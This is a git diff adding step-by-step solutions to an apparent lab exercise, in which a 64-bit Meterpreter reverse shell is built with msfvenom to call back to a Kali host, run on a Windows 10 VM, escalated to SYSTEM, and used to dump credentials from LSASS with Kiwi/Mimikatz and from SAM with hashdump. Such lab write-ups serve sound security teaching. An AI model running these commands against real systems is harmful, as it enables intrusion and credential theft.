@@ -58,4 +58,23 @@ In cybersecurity, understanding how attackers extract credentials is key to effe
 
 
 #### Solutions
-1. 
+1. Since Kiwi is an integration of Mimikatz into Metasploit by providing functionality directly in a Meterpreter session, it requires a 64-bit Meterpreter session to avoid errors such as `ERROR kuhl_m_sekurlsa_acquireLSA ; mimikatz x86 cannot access x64 process`
+2. If the reverse shell in the previous Meterpreter task is 32-bit, recreate a new 64-bit reverse shell using the command:
+   ```
+   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Kali_Linux_IP_address> LPORT=4444 -f exe -o /home/kali/Desktop/reverseshell.exe
+   ```
+3. Move the reverse shell from the Desktop directory into the web server directory (/var/www/html)
+4. Download the reverse shell in the Windows 10 VM and run it as an administrator
+5. Once a Meterpreter session is available in Kali Linux, run `getsystem` to escalate privileges
+6. Confirm you are running as a SYSTEM user using `getuid`. You should see something like `Server username: NT AUTHORITY\SYSTEM`
+7. To load Mimikatz in Meterpreter session, use `load kiwi`
+8. Use `kiwi_cmd sekurlsa::logonpasswords` to extract credentials from LSASS memory. This will dump usernames and password hashes
+9. To dump password hashes from the SAM database, use `hashdump`
+
+Screenshot of how Kiwi is used in a Meterpreter session:
+![image](https://github.com/user-attachments/assets/3fbaa79a-b163-43d5-bc50-7bb025b4c288)
+
+Screenshot of how hashdump is used in a Meterpreter session:
+![image](https://github.com/user-attachments/assets/c7454ba6-d740-40a6-8712-484b0b132c90)
+
+
